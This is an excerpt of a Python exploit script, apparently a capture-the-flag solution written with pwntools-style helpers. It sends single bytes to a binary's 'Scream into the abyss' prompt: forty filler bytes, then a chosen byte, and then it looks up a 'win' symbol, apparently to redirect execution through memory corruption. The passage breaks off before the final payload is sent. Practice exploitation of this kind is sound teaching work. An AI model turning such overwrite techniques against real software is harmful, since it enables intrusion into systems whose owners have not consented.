...
def send_char(byte_to_send):
    sla(b"Scream into the abyss: ", byte_to_send)

def send_qword(qword_int):
    for i in range(8):
        mask = 0xFF << (i * 8)
        masked_val = mask & qword_int 
        byte_to_send_as_int = masked_val >> (i * 8)
        send_char(bytes([byte_to_send_as_int]))

for _ in range(40):
    send_char(b'a')

send_char(bytes([0x48]))
WIN = exe.sym['win']
